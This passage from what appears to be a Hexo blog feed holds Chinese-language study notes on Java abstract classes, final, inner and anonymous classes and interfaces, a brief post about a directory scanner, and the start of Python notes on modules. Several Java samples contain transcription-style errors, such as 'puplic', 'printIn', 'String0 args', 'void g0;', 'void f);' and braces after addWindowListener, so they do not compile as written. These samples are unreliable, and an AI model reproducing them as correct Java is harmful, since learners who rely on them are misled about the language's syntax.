有抽象方法的类一定是抽象类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>; <span class="comment">//没有方法体的方法叫做抽象方法，抽象方法要求末尾必须得加分号，前面必须得加abstract</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//抽象类不一定有抽象方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAbstract_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="抽象方法与抽象类"><a href="#抽象方法与抽象类" class="headerlink" title="抽象方法与抽象类"></a>抽象方法与抽象类</h2><h3 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h3><ul><li>在定义Java方法时可以只给出方法头,而不给出方法内部实现代码这样的方法称为抽象方法。</li><li>凡是没有方法体的方法必须的使用关键字<code>abstract</code>修饰为抽象方法</li><li>凡是含有抽象方法的类都必须的声明为抽象类</li></ul><h3 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h3><ul><li>用<code>abstract</code>关键字来修饰一个类时，该类叫做抽象类;</li><li>包含抽象方法的类必须声明为抽象类。</li><li>但是一个抽象类中却可以不包含任何抽象方法，尽管比较少见</li><li>抽象类不一定有抽象方法</li><li>有抽象方法的一定是抽象类</li></ul><p><strong>父类不是抽象类，子类可以是抽象类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>父类是抽象类，子类也是抽象类，如果不是抽象类就要实现它</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestAbsPoly_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// A aa = new A(); //error 18行</span></span><br><span class="line">        B bb = <span class="keyword">new</span> B(); <span class="comment">//0K</span></span><br><span class="line">bb.f(); <span class="comment">//OK</span></span><br><span class="line">A aa; <span class="comment">//23行  OK可以定义一个抽象类的引用，但是不可以定义一个抽象类的对象，所以18行error，本行OK</span></span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="final-最后的类，不能被继承"><a href="#final-最后的类，不能被继承" class="headerlink" title="final  最后的类，不能被继承"></a>final  最后的类，不能被继承</h1><h3 id="final可以修饰"><a href="#final可以修饰" class="headerlink" title="final可以修饰"></a>final可以修饰</h3><ul><li>整个类</li><li>类中的若干个属性</li><li>类中的若干个方法</li></ul><p><strong>Final修饰整个类，类每个单词的首字母大写</strong><br><strong>■表示该类不能被继承</strong><br><strong>■如果认为一个类己经很完美且不需要定义子类来继承它时，可以使用它</strong><br><strong>■格式:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">puplic <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> 和 <span class="keyword">final</span> 可以互换</span><br></pre></td></tr></table></figure><h3 id="Final修饰类中的若干属性"><a href="#Final修饰类中的若干属性" class="headerlink" title="Final修饰类中的若干属性"></a>Final修饰类中的若干属性</h3><ul><li>Final修饰类中的若干属性表示该属性<strong>必须被赋值</strong>并且<strong>只能被赋一次值</strong></li><li>初始化方式有两种:(只能选择其中的一种)<ul><li>在定义成员变量的同时初始化</li><li>在类中所有的构造函数中初始化</li></ul></li><li>注意:<br>一个类的所有普通方法内部都不可以修改final修饰过的成员变量的值</li></ul><p>例子：表示该方法可以被子类继承，但不可以被子类重写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="comment">//如果在public前面加final，则编译时就会报错</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span> <span class="comment">//重写父类的f方法</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;BBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFinal_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内部类"><a href="#内部类" class="headerlink" title="内部类"></a>内部类</h1><p><strong>内部类可直接访问外部类属性</strong></p><p><strong>我们可以把内部类当做外部类的一个成员</strong></p><ul><li>内部类定义:<ul><li>在A类的内部但是所有方法的外部定义了一个B类，则B类就是A类的<br>内部类,A是B的外部类</li></ul></li><li>内部类访问原则<ul><li><strong>内部类的方法可以访问外部类所有的成员</strong></li><li><strong>外部类的方法不可以直接访问内部类的成员</strong></li></ul></li><li>内部类的优点:<ul><li>可以让一个类方便的访问另一个类中的所有成员</li><li>增加程序的安全性,有效避免其他不相关类对该类的访问</li></ul></li><li>何时使用内部类<ul><li>如果一个<strong>A类要使用B类的所有成员，并且A类不需要被除B类以外的其他类访问</strong>，则我们应当把A类定义为B类的内部类</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TF</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> TextField tf1，tf2，tf3;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">launch</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMonitor</span> <span class="keyword">implements</span> <span class="title">ActionListener</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="meta">@override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> num1 = Integer.parseInt( tf1.getText() );</span><br><span class="line">        <span class="keyword">int</span> num2 = Integer.parseInt( tf2.getText() );</span><br><span class="line">            <span class="keyword">int</span> num3 = num1 + num2;</span><br><span class="line">        tf3.setText(num3 + <span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="匿名类"><a href="#匿名类" class="headerlink" title="匿名类"></a>匿名类</h1><ul><li>匿名类是一种特殊的内部类</li><li>如果在一个方法内部定义了一个匿名类，则该匿名类可以访问<ul><li><strong>外部类的所有成员</strong></li><li><strong>包裹该匿名类的方法中的所有final类型的局部变量</strong><ul><li>注意：非fianl类型的局部变量无法被匿名类访问</li></ul></li></ul></li></ul><h2 id="创建匿名类的三种方式"><a href="#创建匿名类的三种方式" class="headerlink" title="创建匿名类的三种方式"></a>创建匿名类的三种方式</h2><ul><li>继承父类</li><li>实现接口</li><li>实现抽象类</li></ul><h3 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h3><p>假设A是接口名</p><p>格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> A()</span><br><span class="line">&#123;</span><br><span class="line">实现接口中方法的代码</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>功能：<br>    生成一个实现了A接口的匿名类对象</p><h3 id="实现抽象类"><a href="#实现抽象类" class="headerlink" title="实现抽象类"></a>实现抽象类</h3><p>假设A是抽象类</p><p>格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> A()</span><br><span class="line">&#123;·</span><br><span class="line">实现了A类的所有抽象类的方法代码</span><br><span class="line">添加自己的方法或属性代码【不建议，因为没有实际意义】</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能:<br>    生成一个匿名类，该匿名类<strong>必须得实现了A类的所有抽象方法</strong>，当然该匿名类也可以定义自己的属性和方法</p><p><strong>如果A是抽象类，就必须A这个抽象类中所有的抽象方法都实现</strong></p><h3 id="创建匿名类之继承父类"><a href="#创建匿名类之继承父类" class="headerlink" title="创建匿名类之继承父类"></a>创建匿名类之继承父类</h3><p>假设A是个类名</p><p>格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> A()</span><br><span class="line">&#123;</span><br><span class="line">    重写了A类的方法代码</span><br><span class="line">添加自己的属性和法【不建议，因为没有实际意义】</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能：<br>    生成一个A类的子类对象，该匿名类对象继承了A的所有非private成员</p><p>匿名类可以访问包裹该匿名类的这个外部方法的局部变量不过局部变量的类型是final类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestWindowf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//如果把10行的final去掉，本程序在18行就会报错，</span></span><br><span class="line">        <span class="comment">//因为匿名类只能访问包裹它的方法中的final类型的局部变量</span></span><br><span class="line">        <span class="keyword">final</span> Frame f = <span class="keyword">new</span> Frame(); <span class="comment">//10</span></span><br><span class="line">        f.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">        f.addWindowListener</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="keyword">new</span> WindowAdapter()</span><br><span class="line">             &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent e)</span></span></span><br><span class="line"><span class="function">                </span>&#123;</span><br><span class="line">        f.setVisible(<span class="keyword">false</span>); <span class="comment">//18行</span></span><br><span class="line">                    System.exit(-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="匿名类的优缺点"><a href="#匿名类的优缺点" class="headerlink" title="匿名类的优缺点"></a>匿名类的优缺点</h3><ul><li>如果一个类的语句比较少，逻辑比较简单，而且不经常变动，这个时侯可以使用匿名类</li><li>如果一个类包含了很重要的逻辑，将来要经常修改，则这个类就不应该当做匿名类来使用，匿名类会导致代码的混乱</li></ul><h1 id="接口-interface"><a href="#接口-interface" class="headerlink" title="接口  interface"></a>接口  interface</h1><h3 id="接口的定义"><a href="#接口的定义" class="headerlink" title="接口的定义"></a>接口的定义</h3><p>​    就是批象方法和常量值的集合。从本质上讲，接口是一种特殊的抽象类，只允许有一些常量，特殊方法，不允许被修改</p><h3 id="接口的格式"><a href="#接口的格式" class="headerlink" title="接口的格式"></a>接口的格式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[public] interface interfaceName [extends SuperInterfaceList]</span><br><span class="line">&#123;</span><br><span class="line">.....<span class="comment">//常量定义和方法定义</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="详细知识"><a href="#详细知识" class="headerlink" title="详细知识"></a>详细知识</h3><ul><li>接口中定义的属性必须是<code>public static final</code>的，而接口中定义的方法则必须是<code>public abstract</code>的，因此这些修饰符可以部分或全部省略</li><li>接口中定义的属性的值在实现类中不能被更改</li><li>一个类只能实现某个接口，不能继承某个接口</li><li>但接口可以继承接口</li><li>接口不但可以继承接口，而且<strong>可以继承多个接口</strong>，即接口允许多继承</li><li>如果一个类只实现了一个接口的部分方法，则该类必须的声明为抽象类</li><li>一个类可以在继承一个父类的同时实现一个或多个接口，但<strong>extends关键字必须的在implements之前</strong></li></ul><h3 id="接口的实现-implements"><a href="#接口的实现-implements" class="headerlink" title="接口的实现 implements"></a>接口的实现 implements</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">It</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> i = <span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">It2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">20</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">It2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span> <span class="params">()</span> <span class="comment">//implements不能改为extends因为类可以继承类，但类不能继承接口,逻辑意义不通，类可以实现接口</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//i=99; //error</span></span><br><span class="line">        System.out.printf(<span class="string">&quot;i = %d\n&quot;</span>，i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h4><p><strong>如果一个类只实现了一个接口的部分方法，则该类必须的声明为抽象类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">It1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">void</span> g0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">It1</span> //去掉了<span class="title">abstract</span> 就会报错!</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInter_5</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String0 args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    System.out.printIn(<span class="string">&quot;哈哈&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>一个类要想实现某接口中的方法时，必须得在方法返回值前加上public</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">It</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">It</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//public不能丢，也不能改为其他修饰符</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    System.out.printn(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//lt it= new lt(); //error</span></span><br><span class="line">        lt it= <span class="keyword">new</span> A();</span><br><span class="line">        it.f();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="接口的作用"><a href="#接口的作用" class="headerlink" title="接口的作用"></a>接口的作用</h3><ul><li>通过接口可以实现不相关类的相同行为<pre><code>如:Java规定所有可以完成自我复制功能的类都必须得实现java.lang.Colneable接口，但该接口却是空的，该接口中没有任何内容,目的只是为了起个标志作用</code></pre></li><li>接口提供了不同对象进行协作的平台<pre><code>如事件处理</code></pre></li><li>接口可以实现多继承,从一定程序上弥补了类只能单继承的缺陷</li><li>接口是我们了解-一个类功能的重要途径<pre><code>如: Java整个容器框架就是以接口的方式建立起来的，实现不同接口的类完成的是不同的功能，接口使我们了解一个类功能的重要途径</code></pre></li></ul><h3 id="接口与抽象类区别"><a href="#接口与抽象类区别" class="headerlink" title="接口与抽象类区别"></a>接口与抽象类区别</h3><ul><li>接口中的方法不允许有方法体，但抽象类却允许</li><li>Java类不允许多继承，接口却允许多继承<br>■ 接口可以实现多继承，即一个接口可以有多个父类<br>■ 但Java类只允许单继承，即一个类只能有一个父类</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数据类型&quot;&gt;&lt;a href=&quot;#数据类型&quot; class=&quot;headerlink&quot; title=&quot;数据类型&quot;&gt;&lt;/a&gt;数据类型&lt;/h1&gt;&lt;h3 id=&quot;基本数据类型&quot;&gt;&lt;a href=&quot;#基本数据类型&quot; class=&quot;headerlink&quot; title=&quot;基本数据类</summary>
      
    
    
    
    <category term="Java" scheme="http://example.com/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>扫描器V1</title>
    <link href="http://example.com/2021/04/03/%E6%89%AB%E6%8F%8F%E5%99%A8V1/"/>
    <id>http://example.com/2021/04/03/%E6%89%AB%E6%8F%8F%E5%99%A8V1/</id>
    <published>2021-04-03T15:10:17.000Z</published>
    <updated>2021-04-03T15:12:51.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="目录扫描器"><a href="#目录扫描器" class="headerlink" title="目录扫描器"></a>目录扫描器</h2><p>命令行界面，可显示200和403网页网址</p><p><img src="/2021/04/03/%E6%89%AB%E6%8F%8F%E5%99%A8V1/55.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;目录扫描器&quot;&gt;&lt;a href=&quot;#目录扫描器&quot; class=&quot;headerlink&quot; title=&quot;目录扫描器&quot;&gt;&lt;/a&gt;目录扫描器&lt;/h2&gt;&lt;p&gt;命令行界面，可显示200和403网页网址&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/04/03/%E6%89%A</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>模块</title>
    <link href="http://example.com/2021/03/26/%E6%A8%A1%E5%9D%97/"/>
    <id>http://example.com/2021/03/26/%E6%A8%A1%E5%9D%97/</id>
    <published>2021-03-26T13:25:21.000Z</published>
    <updated>2021-03-26T13:34:16.094Z</updated>
    
    <content type="html"><![CDATA[<h2 id="导入模块-import-xx"><a href="#导入模块-import-xx" class="headerlink" title="导入模块 import xx"></a>导入模块 import xx</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__&#x3D;&#x3D;&#39;__main__&#39;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>​    当我们在命令行运行<code>hello</code>模块文件时，Python解释器把一个特殊变量<code>__name__</code>置为<code>__main__</code>，而如果在其他地方导入该<code>hello</code>模块时，<code>if</code>判断将失败，因此，这种<code>if</code>测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。</p><p>​    类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（private），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等</p><h3 id="外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。"><a href="#外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。" class="headerlink" title="外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。"></a>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</h3><h1 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h1><p>​    Windows确保安装时勾选了<code>pip</code>和<code>Add python.exe to Path</code></p><p>​    命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install 模块名</span><br></pre></td></tr></table></figure><p>​    推荐直接使用<a href="https://www.anaconda.com/">Anaconda</a>，内置了许多非常有用的第三方库，装上Anaconda，就相当于把数十个第三方模块自动安装好</p><h3 id="模块搜索路径"><a href="#模块搜索路径" class="headerlink" title="模块搜索路径"></a>模块搜索路径</h3><p>​    当我们试图加载一个模块时，Python会在指定的路径下搜索对应的.py文件，如果找不到，就会报错</p><p>​    默认情况下，Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在<code>sys</code>模块的<code>path</code>变量中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sys</span><br><span class="line">&gt;&gt;&gt; sys.path</span><br><span class="line">[&#39;&#39;, &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python36.zip&#39;, &#39;&#x2F;Library&#x2F;Frameworks&#x2F;Python.framework&#x2F;Versions&#x2F;3.6&#x2F;lib&#x2F;python3.6&#39;, 